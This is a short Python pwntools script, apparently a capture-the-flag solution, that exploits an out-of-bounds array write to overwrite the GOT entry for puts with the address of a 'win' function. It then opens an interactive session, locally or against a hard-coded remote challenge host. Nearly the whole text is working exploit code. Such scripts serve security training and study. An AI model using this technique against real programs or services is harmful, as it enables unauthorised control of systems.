from pwn import *
import sys

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x4012c4
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.71.207.70',1337)
    else:
        return process(e.path,level="error")


offset=(e.got['puts']-e.sym['arr'])/4

p = start()
p.recvuntil(b'Enter the index:') 
p.sendline(b'%i' %offset)
p.recvuntil(b'Enter the value:')
p.sendline(b"%i" %e.sym['win'])
p.interactive()
